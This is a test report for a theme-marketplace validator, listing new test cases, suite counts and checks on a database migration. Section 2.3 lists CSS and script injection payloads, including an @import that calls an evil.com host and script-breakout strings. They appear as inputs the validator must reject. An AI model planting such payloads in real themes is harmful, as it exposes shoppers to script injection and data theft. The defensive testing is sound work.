# Phase AE — Test Report: Marketplace + Partner Readiness

**Program:** LetBuyy Liquid Theme Platform + Shopify-Class Merchant Editor (M→AE)
**Phase:** AE — Marketplace + Partner Readiness
**Date:** 2026-07-11
**Status:** ALL PASS (pre-existing failures unchanged)

---

## 1. Feature Lane — `packages/theme-engine/`

**Command:** `pnpm --filter=@letbuyy/theme-engine typecheck test`
**Result:** PASS
**Typecheck:** 0 errors
**Tests:** 1726 total · 1726 pass · 0 fail · 0 skip
- Baseline entering AE: 1695
- AE new tests: 31
- Total after AE: 1726

**Migration validator command:** `node scripts/validators/migration-safety-validator.mjs database/supabase/migrations/191_theme_purchases_rls_tenant_scope.sql`
**Result:** PASS

---

## 2. New Tests — `test/theme-marketplace-contract.test.ts`

All 31 new AE tests pass. Tests are numbered AE-OK-01 through AE-FC-04 and organised by gate stage.

### 2.1 AE-OK — Fully-clean first-party bundles pass all stages (5 tests)

| Test ID | Fixture | Assertion |
|---------|---------|-----------|
| AE-OK-01 | `createMinimalLiquidThemeBundleFixture()` | `result.ok === true`; 0 blocking violations |
| AE-OK-02 | `createUrbanKicksLiquidThemeBundleFixture()` | `result.ok === true`; 0 blocking violations |
| AE-OK-03 | `createLetbuyyCoreLiquidThemeBundleFixture()` | `result.ok === true`; 0 blocking violations |
| AE-OK-04 | Minimal + `settings_data.current.custom_css = 'body { color: red; }'` | Stage AA passes; `result.ok === true` |
| AE-OK-05 | Minimal + `settings_data.current.custom_css = ''` | Empty string passes Stage AA; `result.ok === true` |

### 2.2 AE-K — Stage K (validateThemeInstall composition) (5 tests)

| Test ID | Input | Expected code | Expected ok |
|---------|-------|---------------|-------------|
| AE-K-01 | `null` | `K:schema-invalid` | `false` |
| AE-K-02 | `{}` | `K:schema-invalid` | `false` |
| AE-K-03 | Valid shape with `schema_version: 'unknown-999'` | `K:schema-invalid` or `K:compat-range` | `false` |
| AE-K-04 | Valid shape with non-matching compat range | `K:compat-range` | `false` |
| AE-K-05 | Bundle with section type gap (parity-gap) | `K:parity-gap` (advisory) | `true` (advisory does not affect ok) |

**Key assertion for AE-K-05:** `result.ok === true`; every violation has `advisory === true`; all violations have `stage === 'K'`. This confirms the design: advisory parity-gap violations do not block marketplace submission.

### 2.3 AE-AA — Stage AA (custom CSS in settings_data.current) (6 tests)

| Test ID | Payload | Assertion |
|---------|---------|-----------|
| AE-AA-01 | `@import url(https://evil.com/steal.css);` | `violations[].code === 'AA:css-injection'`; `ok === false` |
| AE-AA-02 | `background: url(javascript:alert(1));` | `ok === false`; violation message contains `settings_data.current.custom_css` path |
| AE-AA-03 | `</style><script>alert(1)</script><style>` | `ok === false` |
| AE-AA-04 | `color: expression(alert(1));` | `ok === false` |
| AE-AA-05 | Two keys, both infected | Both paths appear in `violations[].message`; `ok === false`; ≥ 2 blocking violations |
| AE-AA-06 | Unicode-escaped `\40import url(evil);` | `ok === false` |

### 2.4 AE-Y — Stage Y (@app block credential key check) (4 tests)

| Test ID | @app block setting | Assertion |
|---------|--------------------|-----------|
| AE-Y-01 | `api_key: 'sk-live-abc123'` | `violations[0].code === 'Y:blocked-setting-key'`; `ok === false` |
| AE-Y-02 | `webhook_secret: 'whs_...'` | `violations[0].code === 'Y:blocked-setting-key'`; `ok === false` |
| AE-Y-03 | `background_color: '#fff'` (safe key) | No Stage Y violations; `ok === true` |
| AE-Y-04 | Non-@app section block with `api_key` setting | Stage Y NOT triggered; no `Y:blocked-setting-key` violation |

AE-Y-04 establishes the non-false-positive guarantee: only `isLiquidAppBlockType()` blocks are checked by Stage Y.

### 2.5 AE-N — Stage N (ThemeDocument parse) (2 tests)

| Test ID | Fixture | Assertion |
|---------|---------|-----------|
| AE-N-01 | Urban Kicks fixture | `toThemeDocumentV2(bundle)` + `parseThemeDocument(doc)` do not throw; no Stage N violations |
| AE-N-02 | Letbuyy Core fixture | Same |

### 2.6 AE-DET — Determinism (3 tests)

| Test ID | Assertion |
|---------|-----------|
| AE-DET-01 | `validateThemeForMarketplace(minimalBundle)` called twice → `JSON.stringify(r1) === JSON.stringify(r2)` |
| AE-DET-02 | `validateThemeForMarketplace(null)` called twice → identical `ok: false` + identical violations |
| AE-DET-03 | Bundle with parity-gap advisories → blocking violations always come before advisory violations |

### 2.7 AE-FC — Fail-closed on malformed input (4 tests)

| Test ID | Input | Assertion |
|---------|-------|-----------|
| AE-FC-01 | `undefined` | `ok === false` |
| AE-FC-02 | `'not-a-bundle'` (string) | `ok === false` |
| AE-FC-03 | `[]` (array) | `ok === false` |
| AE-FC-04 | Six varied inputs: `null, undefined, {}, 'string', 42, [], minimalBundle` | All have `typeof result.ok === 'boolean'`; all have `Array.isArray(result.violations)` |

---

## 3. Full Baseline — Unchanged suites

The suites below ran unchanged. Their counts are reported as carried from Phase AD.

| Suite | Count at Phase AD | Count at Phase AE | Delta |
|-------|-------------------|-------------------|-------|
| `packages/theme-engine/` (all tests) | 1695/1695 | 1726/1726 | +31 (AE) |
| `apps/storefront-runtime/` | 915/915 | 915/915 | 0 |
| `apps/merchant-control-plane/` | 771/771 | 771/771 | 0 |
| `services/api-gateway/` typecheck | 32/32 tasks | 32/32 tasks | 0 |
| `services/api-gateway/` tests (3 pre-existing FOREIGN failures) | ~537/540 | ~537/540 | 0 |

Pre-existing FOREIGN failures (ai#1, executive-analytics#130, payments#298) are NOT program regressions. They pre-date Phase M and are unchanged.

---

## 4. Migration Validator Evidence

**File validated:** `database/supabase/migrations/191_theme_purchases_rls_tenant_scope.sql`

Checks passed:
- No `DROP TABLE` or `DROP TABLE IF EXISTS` — PASS
- No `DROP COLUMN` — PASS
- No `TRUNCATE` — PASS
- No `RENAME TABLE` or `ALTER TABLE ... RENAME COLUMN` — PASS
- `DROP POLICY IF EXISTS` before each `CREATE POLICY` — idempotency confirmed
- Wrapped in `BEGIN; ... COMMIT;` — transactional

**Result:** PASS
